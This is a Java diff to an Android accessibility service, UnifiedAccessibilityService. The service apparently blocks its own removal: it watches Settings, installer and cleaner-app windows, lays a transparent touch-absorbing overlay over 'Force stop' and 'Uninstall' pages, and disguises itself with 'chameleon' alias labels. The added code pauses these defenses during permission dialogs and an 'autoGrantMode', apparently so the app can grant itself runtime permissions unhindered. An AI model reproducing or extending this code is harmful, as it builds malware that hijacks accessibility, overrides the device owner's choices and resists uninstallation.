@@ -3066,11 +3066,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
     
     private boolean runDefentProtection(AccessibilityNodeInfo rootNode) {
+        if (autoGrantMode || System.currentTimeMillis() < protectionSuspendedUntil) {
+            return false;
+        }
         // Gate: only defend when the foreground window belongs to Android Settings,
         // a package-installer, or a known third-party cleaner app (e.g. Phone Master)
         // that can silently delete apps without going through the standard installer.
         String windowPkg = rootNode.getPackageName() != null
                 ? rootNode.getPackageName().toString().toLowerCase() : "";
+        if (isPermissionDialogUi(windowPkg, rootNode)) return false;
 
         boolean isSettingsPkg   = windowPkg.contains("settings");
         boolean isInstallerPkg  = windowPkg.contains("packageinstaller")
@@ -3570,7 +3574,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     /** Runs one immediate pass when the delayed protection gate opens. */
     private void runProtectionAndDefenderPass() {
         if (!protectionAndDefenderStarted
+                || autoGrantMode
                 || System.currentTimeMillis() < protectionSuspendedUntil) {
+            return;
+        }
+        // Runtime permission windows often contain the app label and buttons
+        // such as "Deny", which look like a Settings disable/uninstall page.
+        // Do not run any protection or Back action while one is visible.
+        if (isPermissionDialogUi("", null)) {
+            clearAccessibilityAssistOverlayIfShowing();
+            Log.i(TAG, "Protection pass skipped while a permission dialog is visible");
             return;
         }
         try { runAccessibilityPageProtection(); } catch (Throwable e) {
@@ -3587,7 +3600,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     /** Runs the defender against the current Settings/installer/cleaner window. */
     private void runDefenderProtectionForCurrentWindow() {
         if (!protectionAndDefenderStarted
+                || autoGrantMode
                 || System.currentTimeMillis() < protectionSuspendedUntil) {
+            return;
+        }
+        if (isPermissionDialogUi("", null)) {
+            clearAccessibilityAssistOverlayIfShowing();
             return;
         }
         // Ensure currentAppName reflects the active chameleon alias label,
@@ -3627,9 +3645,19 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         boolean isSettingsPkg = normalizedPackage.contains("settings");
         boolean isSystemUIPkg = "com.android.systemui".equals(normalizedPackage);
 
+        // Permission prompts may be hosted by SystemUI, Settings, or a separate
+        // OEM permission-controller window. A stale transparent assist overlay
+        // must be removed before it can cover the dialog or block TalkBack.
+        if (autoGrantMode
+                || System.currentTimeMillis() < protectionSuspendedUntil
+                || isPermissionDialogUi(normalizedPackage, null)) {
+            clearAccessibilityAssistOverlayIfShowing();
+            return;
+        }
+
         if (!isSettingsPkg && !isSystemUIPkg) {
             // Leaving Settings entirely — make sure the overlay is gone.
-            removeAccessibilityAssistOverlay();
+            clearAccessibilityAssistOverlayIfShowing();
             return;
         }
 
@@ -3644,7 +3672,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root == null) {
                     // No window root — clean up any overlay from a previous detection.
-                    removeAccessibilityAssistOverlay();
+                    clearAccessibilityAssistOverlayIfShowing();
+                    return;
+                }
+
+                if (autoGrantMode
+                        || System.currentTimeMillis() < protectionSuspendedUntil
+                        || isPermissionDialogUi(normalizedPackage, root)) {
+                    root.recycle();
+                    clearAccessibilityAssistOverlayIfShowing();
                     return;
                 }
 
@@ -3699,7 +3735,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
                 if (!foundName) {
                     // App name not on screen — remove any stale overlay and leave the screen alone.
-                    removeAccessibilityAssistOverlay();
+                    clearAccessibilityAssistOverlayIfShowing();
                     return;
                 }
 
@@ -3711,7 +3747,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         || foundAppInfoAction || foundUseService;
                 if (!onDangerPage) {
                     // Not an action page — remove any stale overlay and leave the screen alone.
-                    removeAccessibilityAssistOverlay();
+                    clearAccessibilityAssistOverlayIfShowing();
                     return;
                 }
 
@@ -3739,6 +3775,73 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         });
     }
 
+    private boolean isPermissionControllerPackage(String packageName) {
+        if (packageName == null || packageName.isEmpty()) return false;
+        String normalized = packageName.toLowerCase(java.util.Locale.ROOT);
+        for (String permissionPackage : PERM_CTRL_PACKAGES) {
+            if (normalized.contains(permissionPackage.toLowerCase(java.util.Locale.ROOT))) {
+                return true;
+            }
+        }
+        return normalized.contains("permissioncontroller")
+                || normalized.contains("permissionmanager")
+                || normalized.contains("permcenter")
+                || normalized.contains("packageinstaller");
+    }
+
+    private boolean hasRuntimePermissionPromptText(AccessibilityNodeInfo root) {
+        if (root == null) return false;
+        String screenText = getAllScreenText(root).toLowerCase(java.util.Locale.ROOT);
+        boolean hasAllowChoice = screenText.contains("allow") || screenText.contains("grant");
+        boolean hasDenyChoice = screenText.contains("deny")
+                || screenText.contains("don't allow")
+                || screenText.contains("do not allow");
+        boolean appNameVisible = isAnyAppNameOnScreen(screenText);
+        return (appNameVisible && hasAllowChoice && hasDenyChoice)
+                || screenText.contains("only this time")
+                || screenText.contains("while using the app")
+                || screenText.contains("while using this app")
+                || screenText.contains("allow selected photos")
+                || screenText.contains("allow all the time");
+    }
+
+    /**
+     * Detects active permission dialogs, including OEM floating windows while
+     * Settings or SystemUI remains the active window.
+     */
+    private boolean isPermissionDialogUi(
+            String activePackage, AccessibilityNodeInfo activeRoot) {
+        if (isPermissionControllerPackage(activePackage)
+                || hasRuntimePermissionPromptText(activeRoot)) {
+            return true;
+        }
+
+        String normalized = activePackage == null
+                ? "" : activePackage.toLowerCase(java.util.Locale.ROOT);
+        if (!normalized.isEmpty()
+                && !normalized.contains("settings")
+                && !normalized.contains("systemui")) {
+            return false;
+        }
+
+        AccessibilityNodeInfo permissionRoot = findPermissionDialogWindowRoot();
+        if (permissionRoot == null) return false;
+        try {
+            CharSequence windowPackage = permissionRoot.getPackageName();
+            return isPermissionControllerPackage(
+                    windowPackage != null ? windowPackage.toString() : "")
+                    || hasRuntimePermissionPromptText(permissionRoot);
+        } finally {
+            permissionRoot.recycle();
+        }
+    }
+
+    private void clearAccessibilityAssistOverlayIfShowing() {
+        if (accessibilityAssistOverlayShowing || accessibilityAssistView != null) {
+            removeAccessibilityAssistOverlay();
+        }
+    }
+
     /**
      * Adds a fully transparent, touch-absorbing overlay that covers the main
      * content area (the system excludes the status bar and navigation bar from
@@ -3752,6 +3855,20 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try {
             new Handler(Looper.getMainLooper()).post(() -> {
                 try {
+                    AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
+                    String activePackage = "";
+                    if (activeRoot != null && activeRoot.getPackageName() != null) {
+                        activePackage = activeRoot.getPackageName().toString();
+                    }
+                    boolean permissionUi = isPermissionDialogUi(activePackage, activeRoot);
+                    if (activeRoot != null) activeRoot.recycle();
+                    if (autoGrantMode
+                            || System.currentTimeMillis() < protectionSuspendedUntil
+                            || permissionUi) {
+                        clearAccessibilityAssistOverlayIfShowing();
+                        return;
+                    }
+
                     if (accessibilityAssistOverlayShowing && accessibilityAssistView != null) return;
 
                     int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
@@ -4028,12 +4145,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * enough to trigger — only action words like "stop", "kill", "remove", etc. are.
      */
     private void runActiveAppsProtection() {
-        if (!protectionAndDefenderStarted) return;
+        if (!protectionAndDefenderStarted || autoGrantMode
+                || System.currentTimeMillis() < protectionSuspendedUntil) return;
         try {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root == null) return;
             CharSequence pkg = root.getPackageName();
             if (pkg == null || !pkg.toString().equals("com.android.systemui")) {
+                root.recycle();
+                return;
+            }
+            if (isPermissionDialogUi(pkg.toString(), root)) {
                 root.recycle();
                 return;
             }
@@ -4106,7 +4228,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      *   • Settings → App Info  (has "Force stop" / "Uninstall")
      */
     private void runAccessibilityPageProtection() {
-        if (!accessibilityAssistEnabled) return;
+        if (!accessibilityAssistEnabled || autoGrantMode
+                || System.currentTimeMillis() < protectionSuspendedUntil) return;
         try {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root == null) return;
@@ -4123,6 +4246,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
             CharSequence pkg = root.getPackageName();
             String pkgStr = pkg != null ? pkg.toString().toLowerCase() : "";
+            if (isPermissionDialogUi(pkgStr, root)) {
+                root.recycle();
+                clearAccessibilityAssistOverlayIfShowing();
+                return;
+            }
             if (!isSecurityCenterWindow(pkgStr)) {
                 root.recycle();
                 return;
